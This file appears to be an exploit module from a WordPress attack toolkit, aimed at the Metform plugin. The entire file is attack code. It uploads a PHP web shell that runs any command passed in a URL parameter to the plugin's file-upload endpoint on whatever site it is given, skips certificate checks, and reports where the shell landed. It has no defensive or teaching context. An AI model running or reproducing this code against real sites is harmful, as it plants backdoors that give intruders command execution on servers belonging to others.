import requests
from core.printmodels import *

class Metform_Plugin_RCE:
    def __init__(self):
        self.name = "Metform Plugin RCE"
        self.description = "WordPress Metform Plugin Remote Code Execution"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/wp-content/plugins/metform/core/forms/file-upload.php"
            files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'text/php')}
            response = requests.post(endpoint, files=files, verify=False, timeout=10)
            
            if response.status_code == 200 and "success" in response.text.lower():
                return PrintSuccess(f"[Metform] Vulnerable! Shell uploaded at: {site}/wp-content/uploads/metform/")
            return PrintFailed("[Metform] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Metform] Error: {str(e)}")
